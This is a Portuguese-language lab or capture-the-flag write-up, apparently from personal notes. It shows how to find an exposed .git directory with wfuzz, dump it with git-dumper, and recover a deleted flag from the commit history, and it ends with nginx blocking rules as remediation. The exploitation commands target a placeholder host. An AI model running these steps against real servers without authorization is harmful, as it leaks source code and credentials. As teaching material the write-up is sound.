[[7 - VULN - Git Exposed Attack]]
## **Procedimento Técnico: Exploração de Repositório Git Exposto**

### **Objetivo**

Identificar e explorar um diretório `.git` exposto em um servidor web para reconstrução do repositório e análise de informações sensíveis.

---

### **Etapas Executadas**

#### **1. Enumeração de Diretórios**

**Ferramenta:** `wfuzz`  
**Comando Inicial:**

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://<IP-alvo>/FUZZ
```

**Observação:** Todas as respostas retornaram `200 OK`, dificultando a distinção entre diretórios válidos e falsos positivos.

#### **2. Filtragem por Tamanho de Resposta**

**Comando Refinado:**

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hh 264 http://<IP-alvo>/FUZZ
```

**Resultado:** Foi identificado o diretório `.git` como existente no servidor.

---

#### **3. Extração do Repositório Git**

**Ferramenta:** `git-dumper`  
**Comando:**

```bash
python3 git_dumper.py http://<IP-alvo>/ pasta_destino
```

**Objetivo:** Baixar todos os arquivos do repositório remoto para análise local.

---

#### **4. Análise de Arquivos Extraídos**

**Comandos Utilizados:**

```bash
cd pasta_destino
ls
nano index.php
```

**Objetivo:** Identificar arquivos importantes e examinar conteúdos sensíveis ou ocultos pela aplicação web.

---

#### **5. Investigação do Histórico Git**

**Comando para visualizar commits:**

```bash
git log
```

**Resultado:** Dois commits identificados, sendo um com a mensagem "Removendo flag".

**Comando para inspeção do commit:**

```bash
git show <ID_do_commit>
```

**Descoberta:** O commit anterior revelava uma flag que foi posteriormente removida no histórico (`echo "Get the flag: CS{G1t_3Xp0s3d_4tt4ck}"`).

---

### **Evidência de Vulnerabilidade**

A presença de `.git` exposto permite:

- Reconstrução do repositório.
    
- Acesso a versões anteriores de arquivos sensíveis.
    
- Extração de credenciais, tokens, e outras informações sigilosas.
    

---

### **Classificação da Falha**

- **CVE Relacionado:** Nenhum específico, mas trata-se de uma **misconfiguration crítica**.
    
- **Risco:** **Crítico**
    
- **Impacto:** Acesso a informações sensíveis, lógica do sistema, possíveis credenciais, e vetores de escalonamento.
    

---

### **Recomendações**

- Bloquear o acesso ao diretório `.git` via web server (Apache/Nginx).
    
- Utilizar `.htaccess` (Apache) ou regras no Nginx para negar acesso ao diretório:
    
    ```nginx
    location ~ /\.git {
        deny all;
    }
    ```
    
- Remover arquivos e diretórios de controle de versão de ambientes de produção.
    
- Implementar rotina de revisão de segurança antes de deploy.